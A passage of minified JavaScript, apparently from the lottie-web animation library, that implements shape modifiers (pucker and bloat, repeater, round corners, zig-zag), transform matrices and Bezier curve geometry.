              (ht += gt.addedLength), (St += 1);
            }
            if (
              (o._length &&
                (o.setXYAt(o.v[Ct][0], o.v[Ct][1], "i", Ct),
                o.setXYAt(
                  o.v[o._length - 1][0],
                  o.v[o._length - 1][1],
                  "o",
                  o._length - 1
                )),
              ht > a.e)
            )
              break;
            nt < ot - 1 &&
              ((o = shapePool.newElement()), (Pt = !0), Et.push(o), (St = 0));
          }
          return Et;
        });
      function PuckerAndBloatModifier() {}
      extendPrototype([ShapeModifier], PuckerAndBloatModifier),
        (PuckerAndBloatModifier.prototype.initModifierProperties = function (
          i,
          a
        ) {
          (this.getValue = this.processKeys),
            (this.amount = PropertyFactory.getProp(i, a.a, 0, null, this)),
            (this._isAnimated = !!this.amount.effectsSequence.length);
        }),
        (PuckerAndBloatModifier.prototype.processPath = function (i, a) {
          var o = a / 100,
            s = [0, 0],
            tt = i._length,
            nt = 0;
          for (nt = 0; nt < tt; nt += 1)
            (s[0] += i.v[nt][0]), (s[1] += i.v[nt][1]);
          (s[0] /= tt), (s[1] /= tt);
          var ot = shapePool.newElement();
          ot.c = i.c;
          var st, ft, ht, gt, St, vt;
          for (nt = 0; nt < tt; nt += 1)
            (st = i.v[nt][0] + (s[0] - i.v[nt][0]) * o),
              (ft = i.v[nt][1] + (s[1] - i.v[nt][1]) * o),
              (ht = i.o[nt][0] + (s[0] - i.o[nt][0]) * -o),
              (gt = i.o[nt][1] + (s[1] - i.o[nt][1]) * -o),
              (St = i.i[nt][0] + (s[0] - i.i[nt][0]) * -o),
              (vt = i.i[nt][1] + (s[1] - i.i[nt][1]) * -o),
              ot.setTripleAt(st, ft, ht, gt, St, vt, nt);
          return ot;
        }),
        (PuckerAndBloatModifier.prototype.processShapes = function (i) {
          var a,
            o,
            s = this.shapes.length,
            tt,
            nt,
            ot = this.amount.v;
          if (ot !== 0) {
            var st, ft;
            for (o = 0; o < s; o += 1) {
              if (
                ((st = this.shapes[o]),
                (ft = st.localShapeCollection),
                !(!st.shape._mdf && !this._mdf && !i))
              )
                for (
                  ft.releaseShapes(),
                    st.shape._mdf = !0,
                    a = st.shape.paths.shapes,
                    nt = st.shape.paths._length,
                    tt = 0;
                  tt < nt;
                  tt += 1
                )
                  ft.addShape(this.processPath(a[tt], ot));
              st.shape.paths = st.localShapeCollection;
            }
          }
          this.dynamicProperties.length || (this._mdf = !1);
        });
      var TransformPropertyFactory = (function () {
        var i = [0, 0];
        function a(ft) {
          var ht = this._mdf;
          this.iterateDynamicProperties(),
            (this._mdf = this._mdf || ht),
            this.a && ft.translate(-this.a.v[0], -this.a.v[1], this.a.v[2]),
            this.s && ft.scale(this.s.v[0], this.s.v[1], this.s.v[2]),
            this.sk && ft.skewFromAxis(-this.sk.v, this.sa.v),
            this.r
              ? ft.rotate(-this.r.v)
              : ft
                  .rotateZ(-this.rz.v)
                  .rotateY(this.ry.v)
                  .rotateX(this.rx.v)
                  .rotateZ(-this.or.v[2])
                  .rotateY(this.or.v[1])
                  .rotateX(this.or.v[0]),
            this.data.p.s
              ? this.data.p.z
                ? ft.translate(this.px.v, this.py.v, -this.pz.v)
                : ft.translate(this.px.v, this.py.v, 0)
              : ft.translate(this.p.v[0], this.p.v[1], -this.p.v[2]);
        }
        function o(ft) {
          if (this.elem.globalData.frameId !== this.frameId) {
            if (
              (this._isDirty &&
                (this.precalculateMatrix(), (this._isDirty = !1)),
              this.iterateDynamicProperties(),
              this._mdf || ft)
            ) {
              var ht;
              if (
                (this.v.cloneFromProps(this.pre.props),
                this.appliedTransformations < 1 &&
                  this.v.translate(-this.a.v[0], -this.a.v[1], this.a.v[2]),
                this.appliedTransformations < 2 &&
                  this.v.scale(this.s.v[0], this.s.v[1], this.s.v[2]),
                this.sk &&
                  this.appliedTransformations < 3 &&
                  this.v.skewFromAxis(-this.sk.v, this.sa.v),
                this.r && this.appliedTransformations < 4
                  ? this.v.rotate(-this.r.v)
                  : !this.r &&
                    this.appliedTransformations < 4 &&
                    this.v
                      .rotateZ(-this.rz.v)
                      .rotateY(this.ry.v)
                      .rotateX(this.rx.v)
                      .rotateZ(-this.or.v[2])
                      .rotateY(this.or.v[1])
                      .rotateX(this.or.v[0]),
                this.autoOriented)
              ) {
                var gt, St;
                if (
                  ((ht = this.elem.globalData.frameRate),
                  this.p && this.p.keyframes && this.p.getValueAtTime)
                )
                  this.p._caching.lastFrame + this.p.offsetTime <=
                  this.p.keyframes[0].t
                    ? ((gt = this.p.getValueAtTime(
                        (this.p.keyframes[0].t + 0.01) / ht,
                        0
                      )),
                      (St = this.p.getValueAtTime(
                        this.p.keyframes[0].t / ht,
                        0
                      )))
                    : this.p._caching.lastFrame + this.p.offsetTime >=
                      this.p.keyframes[this.p.keyframes.length - 1].t
                    ? ((gt = this.p.getValueAtTime(
                        this.p.keyframes[this.p.keyframes.length - 1].t / ht,
                        0
                      )),
                      (St = this.p.getValueAtTime(
                        (this.p.keyframes[this.p.keyframes.length - 1].t -
                          0.05) /
                          ht,
                        0
                      )))
                    : ((gt = this.p.pv),
                      (St = this.p.getValueAtTime(
                        (this.p._caching.lastFrame + this.p.offsetTime - 0.01) /
                          ht,
                        this.p.offsetTime
                      )));
                else if (
                  this.px &&
                  this.px.keyframes &&
                  this.py.keyframes &&
                  this.px.getValueAtTime &&
                  this.py.getValueAtTime
                ) {
                  (gt = []), (St = []);
                  var vt = this.px,
                    _t = this.py;
                  vt._caching.lastFrame + vt.offsetTime <= vt.keyframes[0].t
                    ? ((gt[0] = vt.getValueAtTime(
                        (vt.keyframes[0].t + 0.01) / ht,
                        0
                      )),
                      (gt[1] = _t.getValueAtTime(
                        (_t.keyframes[0].t + 0.01) / ht,
                        0
                      )),
                      (St[0] = vt.getValueAtTime(vt.keyframes[0].t / ht, 0)),
                      (St[1] = _t.getValueAtTime(_t.keyframes[0].t / ht, 0)))
                    : vt._caching.lastFrame + vt.offsetTime >=
                      vt.keyframes[vt.keyframes.length - 1].t
                    ? ((gt[0] = vt.getValueAtTime(
                        vt.keyframes[vt.keyframes.length - 1].t / ht,
                        0
                      )),
                      (gt[1] = _t.getValueAtTime(
                        _t.keyframes[_t.keyframes.length - 1].t / ht,
                        0
                      )),
                      (St[0] = vt.getValueAtTime(
                        (vt.keyframes[vt.keyframes.length - 1].t - 0.01) / ht,
                        0
                      )),
                      (St[1] = _t.getValueAtTime(
                        (_t.keyframes[_t.keyframes.length - 1].t - 0.01) / ht,
                        0
                      )))
                    : ((gt = [vt.pv, _t.pv]),
                      (St[0] = vt.getValueAtTime(
                        (vt._caching.lastFrame + vt.offsetTime - 0.01) / ht,
                        vt.offsetTime
                      )),
                      (St[1] = _t.getValueAtTime(
                        (_t._caching.lastFrame + _t.offsetTime - 0.01) / ht,
                        _t.offsetTime
                      )));
                } else (St = i), (gt = St);
                this.v.rotate(-Math.atan2(gt[1] - St[1], gt[0] - St[0]));
              }
              this.data.p && this.data.p.s
                ? this.data.p.z
                  ? this.v.translate(this.px.v, this.py.v, -this.pz.v)
                  : this.v.translate(this.px.v, this.py.v, 0)
                : this.v.translate(this.p.v[0], this.p.v[1], -this.p.v[2]);
            }
            this.frameId = this.elem.globalData.frameId;
          }
        }
        function s() {
          if (
            ((this.appliedTransformations = 0),
            this.pre.reset(),
            !this.a.effectsSequence.length)
          )
            this.pre.translate(-this.a.v[0], -this.a.v[1], this.a.v[2]),
              (this.appliedTransformations = 1);
          else return;
          if (!this.s.effectsSequence.length)
            this.pre.scale(this.s.v[0], this.s.v[1], this.s.v[2]),
              (this.appliedTransformations = 2);
          else return;
          if (this.sk)
            if (
              !this.sk.effectsSequence.length &&
              !this.sa.effectsSequence.length
            )
              this.pre.skewFromAxis(-this.sk.v, this.sa.v),
                (this.appliedTransformations = 3);
            else return;
          this.r
            ? this.r.effectsSequence.length ||
              (this.pre.rotate(-this.r.v), (this.appliedTransformations = 4))
            : !this.rz.effectsSequence.length &&
              !this.ry.effectsSequence.length &&
              !this.rx.effectsSequence.length &&
              !this.or.effectsSequence.length &&
              (this.pre
                .rotateZ(-this.rz.v)
                .rotateY(this.ry.v)
                .rotateX(this.rx.v)
                .rotateZ(-this.or.v[2])
                .rotateY(this.or.v[1])
                .rotateX(this.or.v[0]),
              (this.appliedTransformations = 4));
        }
        function tt() {}
        function nt(ft) {
          this._addDynamicProperty(ft),
            this.elem.addDynamicProperty(ft),
            (this._isDirty = !0);
        }
        function ot(ft, ht, gt) {
          if (
            ((this.elem = ft),
            (this.frameId = -1),
            (this.propType = "transform"),
            (this.data = ht),
            (this.v = new Matrix()),
            (this.pre = new Matrix()),
            (this.appliedTransformations = 0),
            this.initDynamicPropertyContainer(gt || ft),
            ht.p && ht.p.s
              ? ((this.px = PropertyFactory.getProp(ft, ht.p.x, 0, 0, this)),
                (this.py = PropertyFactory.getProp(ft, ht.p.y, 0, 0, this)),
                ht.p.z &&
                  (this.pz = PropertyFactory.getProp(ft, ht.p.z, 0, 0, this)))
              : (this.p = PropertyFactory.getProp(
                  ft,
                  ht.p || { k: [0, 0, 0] },
                  1,
                  0,
                  this
                )),
            ht.rx)
          ) {
            if (
              ((this.rx = PropertyFactory.getProp(
                ft,
                ht.rx,
                0,
                degToRads,
                this
              )),
              (this.ry = PropertyFactory.getProp(
                ft,
                ht.ry,
                0,
                degToRads,
                this
              )),
              (this.rz = PropertyFactory.getProp(
                ft,
                ht.rz,
                0,
                degToRads,
                this
              )),
              ht.or.k[0].ti)
            ) {
              var St,
                vt = ht.or.k.length;
              for (St = 0; St < vt; St += 1)
                (ht.or.k[St].to = null), (ht.or.k[St].ti = null);
            }
            (this.or = PropertyFactory.getProp(ft, ht.or, 1, degToRads, this)),
              (this.or.sh = !0);
          } else
            this.r = PropertyFactory.getProp(
              ft,
              ht.r || { k: 0 },
              0,
              degToRads,
              this
            );
          ht.sk &&
            ((this.sk = PropertyFactory.getProp(ft, ht.sk, 0, degToRads, this)),
            (this.sa = PropertyFactory.getProp(ft, ht.sa, 0, degToRads, this))),
            (this.a = PropertyFactory.getProp(
              ft,
              ht.a || { k: [0, 0, 0] },
              1,
              0,
              this
            )),
            (this.s = PropertyFactory.getProp(
              ft,
              ht.s || { k: [100, 100, 100] },
              1,
              0.01,
              this
            )),
            ht.o
              ? (this.o = PropertyFactory.getProp(ft, ht.o, 0, 0.01, ft))
              : (this.o = { _mdf: !1, v: 1 }),
            (this._isDirty = !0),
            this.dynamicProperties.length || this.getValue(!0);
        }
        (ot.prototype = {
          applyToMatrix: a,
          getValue: o,
          precalculateMatrix: s,
          autoOrient: tt,
        }),
          extendPrototype([DynamicPropertyContainer], ot),
          (ot.prototype.addDynamicProperty = nt),
          (ot.prototype._addDynamicProperty =
            DynamicPropertyContainer.prototype.addDynamicProperty);
        function st(ft, ht, gt) {
          return new ot(ft, ht, gt);
        }
        return { getTransformProperty: st };
      })();
      function RepeaterModifier() {}
      extendPrototype([ShapeModifier], RepeaterModifier),
        (RepeaterModifier.prototype.initModifierProperties = function (i, a) {
          (this.getValue = this.processKeys),
            (this.c = PropertyFactory.getProp(i, a.c, 0, null, this)),
            (this.o = PropertyFactory.getProp(i, a.o, 0, null, this)),
            (this.tr = TransformPropertyFactory.getTransformProperty(
              i,
              a.tr,
              this
            )),
            (this.so = PropertyFactory.getProp(i, a.tr.so, 0, 0.01, this)),
            (this.eo = PropertyFactory.getProp(i, a.tr.eo, 0, 0.01, this)),
            (this.data = a),
            this.dynamicProperties.length || this.getValue(!0),
            (this._isAnimated = !!this.dynamicProperties.length),
            (this.pMatrix = new Matrix()),
            (this.rMatrix = new Matrix()),
            (this.sMatrix = new Matrix()),
            (this.tMatrix = new Matrix()),
            (this.matrix = new Matrix());
        }),
        (RepeaterModifier.prototype.applyTransforms = function (
          i,
          a,
          o,
          s,
          tt,
          nt
        ) {
          var ot = nt ? -1 : 1,
            st = s.s.v[0] + (1 - s.s.v[0]) * (1 - tt),
            ft = s.s.v[1] + (1 - s.s.v[1]) * (1 - tt);
          i.translate(s.p.v[0] * ot * tt, s.p.v[1] * ot * tt, s.p.v[2]),
            a.translate(-s.a.v[0], -s.a.v[1], s.a.v[2]),
            a.rotate(-s.r.v * ot * tt),
            a.translate(s.a.v[0], s.a.v[1], s.a.v[2]),
            o.translate(-s.a.v[0], -s.a.v[1], s.a.v[2]),
            o.scale(nt ? 1 / st : st, nt ? 1 / ft : ft),
            o.translate(s.a.v[0], s.a.v[1], s.a.v[2]);
        }),
        (RepeaterModifier.prototype.init = function (i, a, o, s) {
          for (
            this.elem = i,
              this.arr = a,
              this.pos = o,
              this.elemsData = s,
              this._currentCopies = 0,
              this._elements = [],
              this._groups = [],
              this.frameId = -1,
              this.initDynamicPropertyContainer(i),
              this.initModifierProperties(i, a[o]);
            o > 0;

          )
            (o -= 1), this._elements.unshift(a[o]);
          this.dynamicProperties.length ? (this.k = !0) : this.getValue(!0);
        }),
        (RepeaterModifier.prototype.resetElements = function (i) {
          var a,
            o = i.length;
          for (a = 0; a < o; a += 1)
            (i[a]._processed = !1),
              i[a].ty === "gr" && this.resetElements(i[a].it);
        }),
        (RepeaterModifier.prototype.cloneElements = function (i) {
          var a = JSON.parse(JSON.stringify(i));
          return this.resetElements(a), a;
        }),
        (RepeaterModifier.prototype.changeGroupRender = function (i, a) {
          var o,
            s = i.length;
          for (o = 0; o < s; o += 1)
            (i[o]._render = a),
              i[o].ty === "gr" && this.changeGroupRender(i[o].it, a);
        }),
        (RepeaterModifier.prototype.processShapes = function (i) {
          var a,
            o,
            s,
            tt,
            nt,
            ot = !1;
          if (this._mdf || i) {
            var st = Math.ceil(this.c.v);
            if (this._groups.length < st) {
              for (; this._groups.length < st; ) {
                var ft = { it: this.cloneElements(this._elements), ty: "gr" };
                ft.it.push({
                  a: { a: 0, ix: 1, k: [0, 0] },
                  nm: "Transform",
                  o: { a: 0, ix: 7, k: 100 },
                  p: { a: 0, ix: 2, k: [0, 0] },
                  r: {
                    a: 1,
                    ix: 6,
                    k: [
                      { s: 0, e: 0, t: 0 },
                      { s: 0, e: 0, t: 1 },
                    ],
                  },
                  s: { a: 0, ix: 3, k: [100, 100] },
                  sa: { a: 0, ix: 5, k: 0 },
                  sk: { a: 0, ix: 4, k: 0 },
                  ty: "tr",
                }),
                  this.arr.splice(0, 0, ft),
                  this._groups.splice(0, 0, ft),
                  (this._currentCopies += 1);
              }
              this.elem.reloadShapes(), (ot = !0);
            }
            nt = 0;
            var ht;
            for (s = 0; s <= this._groups.length - 1; s += 1) {
              if (
                ((ht = nt < st),
                (this._groups[s]._render = ht),
                this.changeGroupRender(this._groups[s].it, ht),
                !ht)
              ) {
                var gt = this.elemsData[s].it,
                  St = gt[gt.length - 1];
                St.transform.op.v !== 0
                  ? ((St.transform.op._mdf = !0), (St.transform.op.v = 0))
                  : (St.transform.op._mdf = !1);
              }
              nt += 1;
            }
            this._currentCopies = st;
            var vt = this.o.v,
              _t = vt % 1,
              Et = vt > 0 ? Math.floor(vt) : Math.ceil(vt),
              Ct = this.pMatrix.props,
              Pt = this.rMatrix.props,
              bt = this.sMatrix.props;
            this.pMatrix.reset(),
              this.rMatrix.reset(),
              this.sMatrix.reset(),
              this.tMatrix.reset(),
              this.matrix.reset();
            var xt = 0;
            if (vt > 0) {
              for (; xt < Et; )
                this.applyTransforms(
                  this.pMatrix,
                  this.rMatrix,
                  this.sMatrix,
                  this.tr,
                  1,
                  !1
                ),
                  (xt += 1);
              _t &&
                (this.applyTransforms(
                  this.pMatrix,
                  this.rMatrix,
                  this.sMatrix,
                  this.tr,
                  _t,
                  !1
                ),
                (xt += _t));
            } else if (vt < 0) {
              for (; xt > Et; )
                this.applyTransforms(
                  this.pMatrix,
                  this.rMatrix,
                  this.sMatrix,
                  this.tr,
                  1,
                  !0
                ),
                  (xt -= 1);
              _t &&
                (this.applyTransforms(
                  this.pMatrix,
                  this.rMatrix,
                  this.sMatrix,
                  this.tr,
                  -_t,
                  !0
                ),
                (xt -= _t));
            }
            (s = this.data.m === 1 ? 0 : this._currentCopies - 1),
              (tt = this.data.m === 1 ? 1 : -1),
              (nt = this._currentCopies);
            for (var yt, wt; nt; ) {
              if (
                ((a = this.elemsData[s].it),
                (o = a[a.length - 1].transform.mProps.v.props),
                (wt = o.length),
                (a[a.length - 1].transform.mProps._mdf = !0),
                (a[a.length - 1].transform.op._mdf = !0),
                (a[a.length - 1].transform.op.v =
                  this._currentCopies === 1
                    ? this.so.v
                    : this.so.v +
                      (this.eo.v - this.so.v) *
                        (s / (this._currentCopies - 1))),
                xt !== 0)
              ) {
                for (
                  ((s !== 0 && tt === 1) ||
                    (s !== this._currentCopies - 1 && tt === -1)) &&
                    this.applyTransforms(
                      this.pMatrix,
                      this.rMatrix,
                      this.sMatrix,
                      this.tr,
                      1,
                      !1
                    ),
                    this.matrix.transform(
                      Pt[0],
                      Pt[1],
                      Pt[2],
                      Pt[3],
                      Pt[4],
                      Pt[5],
                      Pt[6],
                      Pt[7],
                      Pt[8],
                      Pt[9],
                      Pt[10],
                      Pt[11],
                      Pt[12],
                      Pt[13],
                      Pt[14],
                      Pt[15]
                    ),
                    this.matrix.transform(
                      bt[0],
                      bt[1],
                      bt[2],
                      bt[3],
                      bt[4],
                      bt[5],
                      bt[6],
                      bt[7],
                      bt[8],
                      bt[9],
                      bt[10],
                      bt[11],
                      bt[12],
                      bt[13],
                      bt[14],
                      bt[15]
                    ),
                    this.matrix.transform(
                      Ct[0],
                      Ct[1],
                      Ct[2],
                      Ct[3],
                      Ct[4],
                      Ct[5],
                      Ct[6],
                      Ct[7],
                      Ct[8],
                      Ct[9],
                      Ct[10],
                      Ct[11],
                      Ct[12],
                      Ct[13],
                      Ct[14],
                      Ct[15]
                    ),
                    yt = 0;
                  yt < wt;
                  yt += 1
                )
                  o[yt] = this.matrix.props[yt];
                this.matrix.reset();
              } else
                for (this.matrix.reset(), yt = 0; yt < wt; yt += 1)
                  o[yt] = this.matrix.props[yt];
              (xt += 1), (nt -= 1), (s += tt);
            }
          } else
            for (nt = this._currentCopies, s = 0, tt = 1; nt; )
              (a = this.elemsData[s].it),
                (o = a[a.length - 1].transform.mProps.v.props),
                (a[a.length - 1].transform.mProps._mdf = !1),
                (a[a.length - 1].transform.op._mdf = !1),
                (nt -= 1),
                (s += tt);
          return ot;
        }),
        (RepeaterModifier.prototype.addShape = function () {});
      function RoundCornersModifier() {}
      extendPrototype([ShapeModifier], RoundCornersModifier),
        (RoundCornersModifier.prototype.initModifierProperties = function (
          i,
          a
        ) {
          (this.getValue = this.processKeys),
            (this.rd = PropertyFactory.getProp(i, a.r, 0, null, this)),
            (this._isAnimated = !!this.rd.effectsSequence.length);
        }),
        (RoundCornersModifier.prototype.processPath = function (i, a) {
          var o = shapePool.newElement();
          o.c = i.c;
          var s,
            tt = i._length,
            nt,
            ot,
            st,
            ft,
            ht,
            gt,
            St = 0,
            vt,
            _t,
            Et,
            Ct,
            Pt,
            bt;
          for (s = 0; s < tt; s += 1)
            (nt = i.v[s]),
              (st = i.o[s]),
              (ot = i.i[s]),
              nt[0] === st[0] &&
              nt[1] === st[1] &&
              nt[0] === ot[0] &&
              nt[1] === ot[1]
                ? (s === 0 || s === tt - 1) && !i.c
                  ? (o.setTripleAt(
                      nt[0],
                      nt[1],
                      st[0],
                      st[1],
                      ot[0],
                      ot[1],
                      St
                    ),
                    (St += 1))
                  : (s === 0 ? (ft = i.v[tt - 1]) : (ft = i.v[s - 1]),
                    (ht = Math.sqrt(
                      Math.pow(nt[0] - ft[0], 2) + Math.pow(nt[1] - ft[1], 2)
                    )),
                    (gt = ht ? Math.min(ht / 2, a) / ht : 0),
                    (Pt = nt[0] + (ft[0] - nt[0]) * gt),
                    (vt = Pt),
                    (bt = nt[1] - (nt[1] - ft[1]) * gt),
                    (_t = bt),
                    (Et = vt - (vt - nt[0]) * roundCorner),
                    (Ct = _t - (_t - nt[1]) * roundCorner),
                    o.setTripleAt(vt, _t, Et, Ct, Pt, bt, St),
                    (St += 1),
                    s === tt - 1 ? (ft = i.v[0]) : (ft = i.v[s + 1]),
                    (ht = Math.sqrt(
                      Math.pow(nt[0] - ft[0], 2) + Math.pow(nt[1] - ft[1], 2)
                    )),
                    (gt = ht ? Math.min(ht / 2, a) / ht : 0),
                    (Et = nt[0] + (ft[0] - nt[0]) * gt),
                    (vt = Et),
                    (Ct = nt[1] + (ft[1] - nt[1]) * gt),
                    (_t = Ct),
                    (Pt = vt - (vt - nt[0]) * roundCorner),
                    (bt = _t - (_t - nt[1]) * roundCorner),
                    o.setTripleAt(vt, _t, Et, Ct, Pt, bt, St),
                    (St += 1))
                : (o.setTripleAt(
                    i.v[s][0],
                    i.v[s][1],
                    i.o[s][0],
                    i.o[s][1],
                    i.i[s][0],
                    i.i[s][1],
                    St
                  ),
                  (St += 1));
          return o;
        }),
        (RoundCornersModifier.prototype.processShapes = function (i) {
          var a,
            o,
            s = this.shapes.length,
            tt,
            nt,
            ot = this.rd.v;
          if (ot !== 0) {
            var st, ft;
            for (o = 0; o < s; o += 1) {
              if (
                ((st = this.shapes[o]),
                (ft = st.localShapeCollection),
                !(!st.shape._mdf && !this._mdf && !i))
              )
                for (
                  ft.releaseShapes(),
                    st.shape._mdf = !0,
                    a = st.shape.paths.shapes,
                    nt = st.shape.paths._length,
                    tt = 0;
                  tt < nt;
                  tt += 1
                )
                  ft.addShape(this.processPath(a[tt], ot));
              st.shape.paths = st.localShapeCollection;
            }
          }
          this.dynamicProperties.length || (this._mdf = !1);
        });
      function floatEqual(i, a) {
        return Math.abs(i - a) * 1e5 <= Math.min(Math.abs(i), Math.abs(a));
      }
      function floatZero(i) {
        return Math.abs(i) <= 1e-5;
      }
      function lerp(i, a, o) {
        return i * (1 - o) + a * o;
      }
      function lerpPoint(i, a, o) {
        return [lerp(i[0], a[0], o), lerp(i[1], a[1], o)];
      }
      function quadRoots(i, a, o) {
        if (i === 0) return [];
        var s = a * a - 4 * i * o;
        if (s < 0) return [];
        var tt = -a / (2 * i);
        if (s === 0) return [tt];
        var nt = Math.sqrt(s) / (2 * i);
        return [tt - nt, tt + nt];
      }
      function polynomialCoefficients(i, a, o, s) {
        return [
          -i + 3 * a - 3 * o + s,
          3 * i - 6 * a + 3 * o,
          -3 * i + 3 * a,
          i,
        ];
      }
      function singlePoint(i) {
        return new PolynomialBezier(i, i, i, i, !1);
      }
      function PolynomialBezier(i, a, o, s, tt) {
        tt && pointEqual(i, a) && (a = lerpPoint(i, s, 1 / 3)),
          tt && pointEqual(o, s) && (o = lerpPoint(i, s, 2 / 3));
        var nt = polynomialCoefficients(i[0], a[0], o[0], s[0]),
          ot = polynomialCoefficients(i[1], a[1], o[1], s[1]);
        (this.a = [nt[0], ot[0]]),
          (this.b = [nt[1], ot[1]]),
          (this.c = [nt[2], ot[2]]),
          (this.d = [nt[3], ot[3]]),
          (this.points = [i, a, o, s]);
      }
      (PolynomialBezier.prototype.point = function (i) {
        return [
          ((this.a[0] * i + this.b[0]) * i + this.c[0]) * i + this.d[0],
          ((this.a[1] * i + this.b[1]) * i + this.c[1]) * i + this.d[1],
        ];
      }),
        (PolynomialBezier.prototype.derivative = function (i) {
          return [
            (3 * i * this.a[0] + 2 * this.b[0]) * i + this.c[0],
            (3 * i * this.a[1] + 2 * this.b[1]) * i + this.c[1],
          ];
        }),
        (PolynomialBezier.prototype.tangentAngle = function (i) {
          var a = this.derivative(i);
          return Math.atan2(a[1], a[0]);
        }),
        (PolynomialBezier.prototype.normalAngle = function (i) {
          var a = this.derivative(i);
          return Math.atan2(a[0], a[1]);
        }),
        (PolynomialBezier.prototype.inflectionPoints = function () {
          var i = this.a[1] * this.b[0] - this.a[0] * this.b[1];
          if (floatZero(i)) return [];
          var a = (-0.5 * (this.a[1] * this.c[0] - this.a[0] * this.c[1])) / i,
            o =
              a * a -
              ((1 / 3) * (this.b[1] * this.c[0] - this.b[0] * this.c[1])) / i;
          if (o < 0) return [];
          var s = Math.sqrt(o);
          return floatZero(s)
            ? s > 0 && s < 1
              ? [a]
              : []
            : [a - s, a + s].filter(function (tt) {
                return tt > 0 && tt < 1;
              });
        }),
        (PolynomialBezier.prototype.split = function (i) {
          if (i <= 0) return [singlePoint(this.points[0]), this];
          if (i >= 1)
            return [this, singlePoint(this.points[this.points.length - 1])];
          var a = lerpPoint(this.points[0], this.points[1], i),
            o = lerpPoint(this.points[1], this.points[2], i),
            s = lerpPoint(this.points[2], this.points[3], i),
            tt = lerpPoint(a, o, i),
            nt = lerpPoint(o, s, i),
            ot = lerpPoint(tt, nt, i);
          return [
            new PolynomialBezier(this.points[0], a, tt, ot, !0),
            new PolynomialBezier(ot, nt, s, this.points[3], !0),
          ];
        });
      function extrema(i, a) {
        var o = i.points[0][a],
          s = i.points[i.points.length - 1][a];
        if (o > s) {
          var tt = s;
          (s = o), (o = tt);
        }
        for (
          var nt = quadRoots(3 * i.a[a], 2 * i.b[a], i.c[a]), ot = 0;
          ot < nt.length;
          ot += 1
        )
          if (nt[ot] > 0 && nt[ot] < 1) {
            var st = i.point(nt[ot])[a];
            st < o ? (o = st) : st > s && (s = st);
          }
        return { min: o, max: s };
      }
      (PolynomialBezier.prototype.bounds = function () {
        return { x: extrema(this, 0), y: extrema(this, 1) };
      }),
        (PolynomialBezier.prototype.boundingBox = function () {
          var i = this.bounds();
          return {
            left: i.x.min,
            right: i.x.max,
            top: i.y.min,
            bottom: i.y.max,
            width: i.x.max - i.x.min,
            height: i.y.max - i.y.min,
            cx: (i.x.max + i.x.min) / 2,
            cy: (i.y.max + i.y.min) / 2,
          };
        });
      function intersectData(i, a, o) {
        var s = i.boundingBox();
        return {
          cx: s.cx,
          cy: s.cy,
          width: s.width,
          height: s.height,
          bez: i,
          t: (a + o) / 2,
          t1: a,
          t2: o,
        };
      }
      function splitData(i) {
        var a = i.bez.split(0.5);
        return [intersectData(a[0], i.t1, i.t), intersectData(a[1], i.t, i.t2)];
      }
      function boxIntersect(i, a) {
        return (
          Math.abs(i.cx - a.cx) * 2 < i.width + a.width &&
          Math.abs(i.cy - a.cy) * 2 < i.height + a.height
        );
      }
      function intersectsImpl(i, a, o, s, tt, nt) {
        if (boxIntersect(i, a)) {
          if (
            o >= nt ||
            (i.width <= s && i.height <= s && a.width <= s && a.height <= s)
          ) {
            tt.push([i.t, a.t]);
            return;
          }
          var ot = splitData(i),
            st = splitData(a);
          intersectsImpl(ot[0], st[0], o + 1, s, tt, nt),
            intersectsImpl(ot[0], st[1], o + 1, s, tt, nt),
            intersectsImpl(ot[1], st[0], o + 1, s, tt, nt),
            intersectsImpl(ot[1], st[1], o + 1, s, tt, nt);
        }
      }
      (PolynomialBezier.prototype.intersections = function (i, a, o) {
        a === void 0 && (a = 2), o === void 0 && (o = 7);
        var s = [];
        return (
          intersectsImpl(
            intersectData(this, 0, 1),
            intersectData(i, 0, 1),
            0,
            a,
            s,
            o
          ),
          s
        );
      }),
        (PolynomialBezier.shapeSegment = function (i, a) {
          var o = (a + 1) % i.length();
          return new PolynomialBezier(i.v[a], i.o[a], i.i[o], i.v[o], !0);
        }),
        (PolynomialBezier.shapeSegmentInverted = function (i, a) {
          var o = (a + 1) % i.length();
          return new PolynomialBezier(i.v[o], i.i[o], i.o[a], i.v[a], !0);
        });
      function crossProduct(i, a) {
        return [
          i[1] * a[2] - i[2] * a[1],
          i[2] * a[0] - i[0] * a[2],
          i[0] * a[1] - i[1] * a[0],
        ];
      }
      function lineIntersection(i, a, o, s) {
        var tt = [i[0], i[1], 1],
          nt = [a[0], a[1], 1],
          ot = [o[0], o[1], 1],
          st = [s[0], s[1], 1],
          ft = crossProduct(crossProduct(tt, nt), crossProduct(ot, st));
        return floatZero(ft[2]) ? null : [ft[0] / ft[2], ft[1] / ft[2]];
      }
      function polarOffset(i, a, o) {
        return [i[0] + Math.cos(a) * o, i[1] - Math.sin(a) * o];
      }
      function pointDistance(i, a) {
        return Math.hypot(i[0] - a[0], i[1] - a[1]);
      }
      function pointEqual(i, a) {
        return floatEqual(i[0], a[0]) && floatEqual(i[1], a[1]);
      }
      function ZigZagModifier() {}
      extendPrototype([ShapeModifier], ZigZagModifier),
        (ZigZagModifier.prototype.initModifierProperties = function (i, a) {
          (this.getValue = this.processKeys),
            (this.amplitude = PropertyFactory.getProp(i, a.s, 0, null, this)),
            (this.frequency = PropertyFactory.getProp(i, a.r, 0, null, this)),
            (this.pointsType = PropertyFactory.getProp(i, a.pt, 0, null, this)),
            (this._isAnimated =
              this.amplitude.effectsSequence.length !== 0 ||
              this.frequency.effectsSequence.length !== 0 ||
              this.pointsType.effectsSequence.length !== 0);
        });
      function setPoint(i, a, o, s, tt, nt, ot) {
        var st = o - Math.PI / 2,
          ft = o + Math.PI / 2,
          ht = a[0] + Math.cos(o) * s * tt,
          gt = a[1] - Math.sin(o) * s * tt;
        i.setTripleAt(
          ht,
          gt,
          ht + Math.cos(st) * nt,
          gt - Math.sin(st) * nt,
          ht + Math.cos(ft) * ot,
          gt - Math.sin(ft) * ot,
          i.length()
        );
      }
      function getPerpendicularVector(i, a) {
        var o = [a[0] - i[0], a[1] - i[1]],
          s = -Math.PI * 0.5,
          tt = [
            Math.cos(s) * o[0] - Math.sin(s) * o[1],
            Math.sin(s) * o[0] + Math.cos(s) * o[1],
          ];
        return tt;
      }
      function getProjectingAngle(i, a) {
        var o = a === 0 ? i.length() - 1 : a - 1,
          s = (a + 1) % i.length(),
          tt = i.v[o],
          nt = i.v[s],
          ot = getPerpendicularVector(tt, nt);
        return Math.atan2(0, 1) - Math.atan2(ot[1], ot[0]);
      }
      function zigZagCorner(i, a, o, s, tt, nt, ot) {
        var st = getProjectingAngle(a, o),
          ft = a.v[o % a._length],
